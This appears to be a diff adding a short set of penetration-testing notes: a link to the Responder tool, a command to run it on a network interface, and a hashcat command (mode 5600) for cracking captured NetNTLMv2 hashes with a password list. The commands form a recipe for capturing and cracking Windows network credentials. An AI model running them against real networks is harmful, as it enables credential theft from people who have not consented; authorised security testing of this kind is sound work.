@@ -1,0 +1,5 @@
+https://github.com/lgandx/Responder
+
+sudo responder -I <interface>
+
+hashcat -m 5600 <hash file> <password file> --force
